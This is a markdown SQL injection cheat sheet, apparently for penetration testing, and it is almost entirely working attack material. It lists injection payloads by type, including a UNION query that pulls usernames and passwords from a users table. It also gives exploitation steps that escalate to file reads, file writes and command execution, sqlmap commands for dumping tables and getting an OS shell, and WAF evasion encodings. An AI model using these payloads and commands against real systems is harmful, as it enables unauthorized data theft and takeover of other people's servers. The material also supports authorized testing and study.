# SQL Injection — Full Technique Reference

## Detection Payloads (by type)

### Error-based
```
' OR 1=1--
' OR 1=1#
" OR 1=1--
') OR 1=1--
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
```

### Boolean-based blind
```
' AND 1=1--    (true condition — normal response)
' AND 1=2--    (false condition — different response)
' AND SUBSTRING(@@version,1,1)='5'--
```

### Time-based blind
```
' OR SLEEP(5)--           (MySQL)
' OR pg_sleep(5)--        (PostgreSQL)
'; WAITFOR DELAY '0:0:5'  (MSSQL)
```

### UNION-based
```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--            (increment NULLs until no error)
' UNION SELECT 1,2,3--               (find which columns are displayed)
' UNION SELECT username,password FROM users--
```

## Exploitation Steps

1. **Confirm injection**: Use a simple `'` and observe error/behavior change.
2. **Determine DB type**: Error messages, version functions, syntax differences.
3. **Find column count**: `ORDER BY N--` with increasing N until error.
4. **UNION extraction**: Match column count, extract data.
5. **Escalate**: Read files (`LOAD_FILE`), write files (`INTO OUTFILE`), execute commands.

## sqlmap Cheat Sheet
```bash
# Basic scan
sqlmap -u "http://target/page?id=1" --batch

# With POST data
sqlmap -u "http://target/login" --data "user=test&pass=test" --batch

# Enumerate databases
sqlmap -u "http://target/page?id=1" --dbs --batch

# Enumerate tables
sqlmap -u "http://target/page?id=1" -D dbname --tables --batch

# Dump table
sqlmap -u "http://target/page?id=1" -D dbname -T users --dump --batch

# OS shell (if possible)
sqlmap -u "http://target/page?id=1" --os-shell --batch
```

## WAF Bypass Techniques
- Comment injection: `/*!50000UNION*/+/*!50000SELECT*/`
- Case alternation: `uNiOn SeLeCt`
- Double URL encoding: `%2527` instead of `'`
- HPP: `id=1&id=UNION+SELECT+...`
